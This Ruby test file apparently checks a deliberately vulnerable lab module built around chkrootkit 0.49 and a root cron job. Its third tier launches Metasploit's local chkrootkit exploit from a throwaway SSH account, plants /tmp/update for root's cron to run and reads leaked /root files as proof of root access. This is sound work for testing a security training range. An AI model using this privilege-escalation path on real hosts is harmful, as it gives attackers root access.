require_relative '../../../../../lib/post_provision_test'

class ChkrootkitVulnTest < PostProvisionTest
  def initialize
    self.module_name = 'chkrootkit'
    self.module_path = get_module_path(__FILE__)
    super
  end

  def test_module
    super
    tier(1) do
      test_local_command('Chkrootkit binary exists?', 'sudo ls -la /usr/sbin/chkrootkit', 'chkrootkit-0.49')

      # leaked_filenames/strings_to_leak: leak_files writes these into /root, where
      # the local privilege-escalation payload (running as root via cron) can read them.
      self.json_inputs['leaked_filenames']&.each_with_index do |filename, i|
        leaked_string = self.json_inputs['strings_to_leak']&.at(i)
        leak_path = "/root/#{filename}"
        test_local_command("leaked file #{filename} present", "sudo test -f #{leak_path} && echo ok", 'ok')
        if leaked_string
          test_local_command("leaked file #{filename} contains expected string", "sudo cat #{leak_path}", leaked_string)
        end
      end

      # cron_frequency: confirm root's crontab was configured to run chkrootkit at the
      # chosen frequency (this is what makes the privilege escalation exploitable without
      # a long wait).
      minute_frequency = case self.json_inputs['cron_frequency']&.first
                          when '5_minutes' then '*/5'
                          when '15_minutes' then '*/15'
                          when '30_minutes' then '*/30'
                          else '*'
                          end
      test_local_command('root cron job for chkrootkit configured',
                          'sudo crontab -u root -l',
                          "#{minute_frequency} * * * * /usr/sbin/chkrootkit")
    end

    tier(2) do
      test_local_command('Chkrootkit runs?', 'sudo /usr/sbin/chkrootkit -V 2>&1', 'chkrootkit version 0.49')
    end

    # Tier 3: exploit/unix/local/chkrootkit is a LOCAL privilege escalation — Metasploit
    # drives it against an existing low-privilege SESSION, not a remote RHOSTS call. So we
    # give the attacker a foothold: a throwaway unprivileged account the attacker's ssh_login
    # lands on (created and removed by the test, so the image ships no extra login), run the
    # local exploit against that session (it plants an executable /tmp/update), then wait for
    # root's chkrootkit cron to run it. The sentinel then shows uid=0 — a root shell — which
    # is what <privilege>=root_rwx asserts. SKIPs cleanly with no attacker VM in the project.
    tier(3) do
      # Leak contents go into the sentinel as evidence that root-level read is achieved.
      collect = self.json_inputs['leaked_filenames']
                    &.map { |f| "cat /root/#{Shellwords.escape(f)}" }&.join('; ')

      # chkrootkit runs via root's cron at cron_frequency; wait at least one tick (plus
      # chkrootkit's own runtime) for the planted /tmp/update to execute. wait_for_sentinel
      # returns as soon as it fires, so the margin only bounds the worst case.
      sentinel_wait = case self.json_inputs['cron_frequency']&.first
                      when '30_minutes' then 1920
                      when '15_minutes' then 1020
                      when '5_minutes'  then 360
                      else 180
                      end

      with_throwaway_ssh_user do |user, pass|
        test_msf_local_exploit('exploit/unix/local/chkrootkit',
                               session_user: user, session_pass: pass,
                               # AllowNoCleanup: cmd/unix/generic opens no session, so the
                               # module can't remove /tmp/update afterwards and refuses to
                               # plant it unless told the leftover is acceptable (it is — the
                               # test VM is discarded, and the throwaway user's teardown rm's it).
                               options: { 'CHKROOTKIT' => '/usr/sbin/chkrootkit',
                                          'AllowNoCleanup' => true },
                               collect: collect,
                               expect_privilege: :root,
                               sentinel_wait: sentinel_wait)
      end
    end
  end

end
ChkrootkitVulnTest.new.run